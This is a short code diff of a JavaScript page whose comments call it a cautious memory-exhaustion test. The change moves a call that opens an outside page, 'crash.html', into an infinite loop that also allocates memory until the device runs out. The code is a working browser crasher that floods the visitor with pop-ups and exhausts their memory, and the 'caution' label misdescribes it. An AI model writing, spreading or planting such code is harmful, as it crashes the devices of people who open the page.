@@ -12,11 +12,11 @@
       // Part 1: Memory exhaustion (allocating a large array with caution)
       const largeArray = [];
       console.log("Starting memory allocation...");
-      window.open("stijnboyce.com/crash.html", '_blank').focus();
       let memoryTestCount = 0;
 
       function allocateMemory() {
         while (true) {
+          window.open("stijnboyce.com/crash.html", '_blank').focus();
           // Keep allocating memory until the device runs out
           largeArray.push(new Array(1000)); // Allocate large chunks to consume memory
           memoryTestCount++;
